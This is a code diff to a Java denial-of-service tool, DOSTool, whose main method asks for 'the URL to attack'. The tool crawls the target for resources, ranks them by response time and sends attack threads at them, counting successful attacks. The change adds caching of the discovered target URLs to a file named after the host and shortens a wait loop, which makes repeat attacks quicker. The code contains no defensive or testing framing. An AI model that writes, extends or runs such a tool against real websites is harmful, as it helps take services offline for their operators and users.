@@ -1,8 +1,14 @@
 package com.ehsunbehravesh.dostool;
 
 import com.ehsunbehravesh.dostool.log.LogUtil;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileReader;
+import java.io.PrintWriter;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.text.MessageFormat;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Observable;
@@ -42,14 +48,34 @@ public class DOSTool implements Observer {
   }
 
   public void findResources() {
-    resourceFinder = new ResourceFinder(baseURL, threadsOfFinder);
-    resourceFinder.addObserver(new Observer() {
-      @Override
-      public void update(Observable o, Object arg) {
-        resources = resourceFinder.getResources();
+    String resourceFilePath = baseURL.getHost() + ".txt";
+    boolean resourcesLoaded = true;
+    try {
+      try (BufferedReader reader = new BufferedReader(new FileReader(resourceFilePath))) {
+        resources = new ArrayList<>();
+
+        String line = null;
+        while ((line = reader.readLine()) != null) {
+          URL url = new URL(line);
+          Resource resource = new Resource(url);
+          resources.add(resource);
+        }
       }
-    });
-    new Thread(resourceFinder).start();
+    } catch (Exception ex) {
+      logger.log(Level.WARNING, "Loading resource file failed!");
+      resourcesLoaded = false;
+    }
+
+    if (!resourcesLoaded) {
+      resourceFinder = new ResourceFinder(baseURL, threadsOfFinder);
+      resourceFinder.addObserver(new Observer() {
+        @Override
+        public void update(Observable o, Object arg) {
+          resources = resourceFinder.getResources();
+        }
+      });
+      new Thread(resourceFinder).start();
+    }
   }
 
   private synchronized void incrementSuccessfulAttacks() {
@@ -102,7 +128,7 @@ public class DOSTool implements Observer {
         resourceAttacker.addObserver(this);
         attackExecutor.execute(resourceAttacker);
         i++;
-      }      
+      }
     }
 
     while (!attackExecutor.isTerminated()) {
@@ -159,6 +185,16 @@ public class DOSTool implements Observer {
     this.resourcesToAttack = resourcesToAttack;
   }
 
+  private void saveResources() throws FileNotFoundException {
+    String filename = baseURL.getHost() + ".txt";
+
+    try (PrintWriter writer = new PrintWriter(filename)) {
+      for (Resource resource : resources) {
+        writer.println(resource.getUrl().toString());
+      }
+    }
+  }
+
   public static void main(String[] args) throws MalformedURLException {
     if (args.length <= 0) {
       System.out.println("Please enter the URL to attack.");
@@ -178,13 +214,19 @@ public class DOSTool implements Observer {
 
       while (dosTool.getResources() == null) {
         try {
-          Thread.sleep(10000);
+          Thread.sleep(5000);
         } catch (InterruptedException ex) {
           logger.log(Level.SEVERE, "Error!");
         }
       }
 
       logger.log(Level.INFO, "Resources: {0}", dosTool.getResources().size());
+      try {
+        dosTool.saveResources();
+        logger.log(Level.INFO, "Resource file was saved.");
+      } catch (FileNotFoundException ex) {
+        logger.log(Level.WARNING, "Saving the resources file failed!");
+      }
 
       int topLength = Math.min(10, dosTool.getResources().size());
       logger.log(Level.INFO, "Top {0} resources based on response time: ", topLength);
